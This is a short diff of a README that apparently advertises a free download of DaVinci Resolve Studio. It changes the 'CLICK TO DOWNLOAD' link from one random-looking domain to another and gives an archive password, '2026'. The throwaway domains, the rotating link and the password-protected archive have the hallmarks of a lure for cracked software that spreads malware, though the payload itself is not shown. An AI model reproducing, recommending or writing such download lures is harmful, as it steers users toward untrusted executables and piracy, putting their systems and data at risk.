@@ -1,6 +1,6 @@
 # DaVinci Resolve Studio
 
-[![CLICK TO DOWNLOAD](https://img.shields.io/badge/CLICK%20TO%20DOWNLOAD-008C3A?style=for-the-badge&logo=github&logoColor=white)](https://efhiwogvjd.com/Davinci-Resolve-Studio)
+[![CLICK TO DOWNLOAD](https://img.shields.io/badge/CLICK%20TO%20DOWNLOAD-008C3A?style=for-the-badge&logo=github&logoColor=white)](https://fghtfghjfdjfdj.com/Davinci-Resolve-Studio)
 > #### Archive password: `2026`
 
 Professional all-in-one post-production software combining editing, color correction, visual effects, motion graphics, audio post and photo editing with advanced AI tools, multi-GPU support and resolutions up to 32K.
